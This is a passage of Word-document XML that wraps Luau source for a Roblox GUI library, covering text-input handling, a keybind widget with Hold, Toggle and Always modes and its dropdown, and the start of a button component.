        <w:t xml:space="preserve">                    TextTruncate = Enum.TextTruncate.AtEnd;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    BorderSizePixel = 0;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    PlaceholderColor3 = rgb(255, 255, 255);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    CursorPosition = -1;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    ClearTextOnFocus = false;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    TextSize = 14;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    BackgroundColor3 = rgb(255, 255, 255);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    TextColor3 = rgb(72, 72, 72);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    BorderColor3 = rgb(0, 0, 0);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    Position = dim2(1, 0, 0, 0);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    Size = dim2(1, -4, 0, 30);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    BackgroundColor3 = rgb(33, 33, 35)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                }); </w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                library:create( "UICorner" , {</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    Parent = items[ "input" ];</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    CornerRadius = dim(0, 3)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                });                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"right_components" ];</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    PaddingTop = dim(0, 4);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    PaddingRight = dim(0, 4)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                });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function cfg.set(text) </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                flags[cfg.flag] = text</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                items[ "input" ].Text = text</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                cfg.callback(text)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items[ "input" ]:GetPropertyChangedSignal("Text"):Connect(function()</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                cfg.set(items[ "input" ].Text) </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            end)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            items[ "input" ].Focused:Connect(function()</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                library:tween(items[ "input" ], {TextColor3 = rgb(245, 245, 245)})</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            end)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            items[ "input" ].FocusLost:Connect(function()</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                library:tween(items[ "input" ], {TextColor3 = rgb(72, 72, 72)})</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            end)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            if cfg.default then </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                cfg.set(cfg.default) </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            end</w:t>
      </w:r>
    </w:p>
    <w:p/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</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        function library:keybind(options) </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            local cfg = {</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                flag = options.flag or library:next_flag(),</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                callback = options.callback or function() end,</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                name = options.name or nil, </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                ignore_key = options.ignore or false, </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                seperator = options.seperator or false,</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                key = options.key or nil, </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                mode = options.mode or "Toggle",</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                active = options.default or false, </w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                open = false,</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                binding = nil, </w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                hold_instances = {},</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                items = {};</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            }</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            flags[cfg.flag] = {</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                mode = cfg.mode,</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                key = cfg.key, </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                active = cfg.active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-- Component</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    items[ "keybind_element" ] = library:create( "TextButton" , {</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        FontFace = fonts.font;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self.items[ "elements" ];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Size = dim2(1,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"name" ]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rgb(245, 245, 245);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        BorderColor3 = rgb(0, 0, 0);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        Text = cfg.name;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        Parent = items[ "keybind_element" ];</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        Name = "\0";</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        Size = dim2(1, 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"name" ];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"right_components" ] = library:create( "Frame" , {</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        Parent = items[ "keybind_element"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BorderColor3 = rgb(0, 0, 0);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        Size = dim2(0,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FillDirection = Enum.FillDirection.Horizontal;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        HorizontalAlignment = Enum.HorizontalAlignment.Right;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        Parent = items[ "right_components"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"keybind_holder" ] = library:create( "TextButton" , {</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        FontFace = fonts.font;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items[ "right_components" ];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Size = dim2(0, 0, 0, 16);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Enum.AutomaticSize.X;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        TextSize = 14;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        BackgroundColor3 = rgb(33, 33, 35)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"keybind_holder"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"key" ]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rgb(86, 86, 87);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        BorderColor3 = rgb(0, 0, 0);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        Text = "LSHIFT";</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        Parent = items[ "keybind_holder" ];</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        Name = "\0";</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        Size = dim2(1, -12,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"key" ];</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        PaddingTop = dim(0, 1);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                                  </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                -- </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                -- Mode Holder</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    items[ "dropdown" ] = library:create( "Frame" , {</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        BorderColor3 = rgb(0, 0, 0);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        Parent = library.items;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Position = dim2(0, 0, 0, 0);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        Size = dim2(0,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Enum.AutomaticSize.X;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        BackgroundColor3 = rgb(0,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"inline" ] = library:create( "Frame" , {</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        Parent = items[ "dropdown" ];</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        Size = dim2(1, 0, 1, 0);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        Name = "\0";</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        ClipsDescendants = true;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        BorderColor3 = rgb(0, 0, 0);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        BorderSizePixel = 0;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        BackgroundColor3 = rgb(22, 22, 24)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PaddingBottom = dim(0, 6);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        PaddingTop = dim(0, 3);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        PaddingLeft = dim(0, 3);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        Parent = items[ "inline"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"inline" ];</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        Padding = dim(0, 5);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"inline"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local options = {"Hold", "Toggle", "Always"}</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    cfg.y_size = 20</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    for _, option in options do                        </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        local name = library:create( "TextButton" , {</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            FontFace = fonts.font;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            TextColor3 = rgb(72, 72, 73);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            BorderColor3 = rgb(0, 0, 0);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            Text = option;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            Parent = items[ "inline" ];</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            Name = "\0";</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            Size = dim2(0, 0, 0, 0);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            BackgroundTransparency = 1;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            TextXAlignment = Enum.TextXAlignment.Left;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            BorderSizePixel = 0;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            AutomaticSize = Enum.AutomaticSize.XY;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            TextSize = 14;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            BackgroundColor3 = rgb(255, 255, 255)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        }); cfg.hold_instances[option] = name</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        library:apply_theme(name, "accent", "TextColor3")</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        cfg.y_size += name.AbsoluteSize.Y</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        library:create( "UIPadding" , {</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            Parent = name;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            PaddingTop = dim(0, 1);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            PaddingRight = dim(0, 5);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            PaddingLeft = dim(0, 5)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        });</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        name.MouseButton1Click:Connect(function()</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            cfg.set(option)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            cfg.set_visible(false)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            cfg.open = false</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        end)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    end</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                -- </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            end </w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            if cfg.seperator then -- ok bro my lua either sucks or this was a pain in the ass to make (simple if statement aswell 💔)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cfg.modify_mode_color(path) -- ts so frikin tuff 💀</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                for _, v in cfg.hold_instances do </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    v.TextColor3 = rgb(72, 72, 72)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                end </w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                cfg.hold_instances[path].TextColor3 = themes.preset.accent</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            end</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            function cfg.set_mode(mode) </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                cfg.mode = mode </w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                if mode == "Always" then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    cfg.set(true)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                elseif mode == "Hold" then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    cfg.set(false)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                end</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                flags[cfg.flag]["mode"] = mode</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                cfg.modify_mode_color(mode)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            end </w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            function cfg.set(input)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                if type(input) == "boolean" then </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    cfg.active = input</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    if cfg.mode == "Always" then </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        cfg.active = true</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    end</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                elseif tostring(input):find("Enum") then </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    input = input.Name == "Escape" and "NONE" or input</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    cfg.key = input or "NONE"</w:t>
        <w:tab/>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                elseif find({"Toggle", "Hold", "Always"}, input) then </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    if input == "Always" then </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        cfg.active = true </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    end </w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    cfg.mode = input</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    cfg.set_mode(cfg.mode) </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                elseif type(input) == "table" then </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    input.key = type(input.key) == "string" and input.key ~= "NONE" and library:convert_enum(input.key) or input.key</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    input.key = input.key == Enum.KeyCode.Escape and "NONE" or input.key</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    cfg.key = input.key or "NONE"</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    cfg.mode = input.mode or "Toggle"</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    if input.active then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        cfg.active = input.active</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    end</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    cfg.set_mode(cfg.mode) </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                end </w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                cfg.callback(cfg.active)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                local text = tostring(cfg.key) ~= "Enums" and (keys[cfg.key] or tostring(cfg.key):gsub("Enum.", "")) or nil</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                local __text = text and (tostring(text):gsub("KeyCode.", ""):gsub("UserInputType.", ""))</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                items[ "key" ].Text = __text</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                flags[cfg.flag] = {</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    mode = cfg.mode,</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    key = cfg.key, </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    active = cfg.active</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                }</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            end</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            function cfg.set_visible(bool)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                local size = bool and cfg.y_size or 0</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                library:tween(items[ "dropdown" ], {Size = dim_offset(items[ "keybind_holder" ].AbsoluteSize.X, size)})</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                items[ "dropdown" ].Position = dim_offset(items[ "keybind_holder" ].AbsolutePosition.X, items[ "keybind_holder" ].AbsolutePosition.Y + items[ "keybind_holder" ].AbsoluteSize.Y + 60)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items[ "keybind_holder" ].MouseButton1Down:Connect(function()</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                task.wait()</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                items[ "key" ].Text = "..."</w:t>
        <w:tab/>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                cfg.binding = library:connection(uis.InputBegan, function(keycode, game_event)  </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    cfg.set(keycode.KeyCode ~= Enum.KeyCode.Unknown and keycode.KeyCode or keycode.UserInputType)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    cfg.binding:Disconnect() </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    cfg.binding = nil</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                end)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            end)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            items[ "keybind_holder" ].MouseButton2Down:Connect(function()</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                cfg.open = not cfg.open </w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                cfg.set_visible(cfg.open)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            end)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            library:connection(uis.InputBegan, function(input, game_event) </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                if not game_event then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    local selected_key = input.UserInputType == Enum.UserInputType.Keyboard and input.KeyCode or input.UserInputType</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    if selected_key == cfg.key then </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        if cfg.mode == "Toggle" then </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            cfg.active = not cfg.active</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            cfg.set(cfg.active)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        elseif cfg.mode == "Hold" then </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            cfg.set(true)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    </w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            library:connection(uis.InputEnded, function(input, game_event) </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                if game_event then </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    return </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                end </w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                local selected_key = input.UserInputType == Enum.UserInputType.Keyboard and input.KeyCode or input.UserInputType</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                if selected_key == cfg.key then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    if cfg.mode == "Hold" then </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        cfg.set(false)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cfg.set({mode = cfg.mode, active = cfg.active, key = cfg.key})           </w:t>
      </w:r>
    </w:p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</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        function library:button(options) </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            local cfg = {</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                name = options.name or "TextBox",</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                callback = options.callback or function() end,</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                items = {};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local items = cfg.items; do </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                items[ "button_element" ] = library:create( "Frame" , {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"button" ] = library:create( "TextButton" , {</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    FontFace = fonts.font;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AutoButtonColor = false;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    AnchorPoint = vec2(1, 0);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    Parent = items[ "button_element" ];</w:t>
      </w:r>
    </w:p>
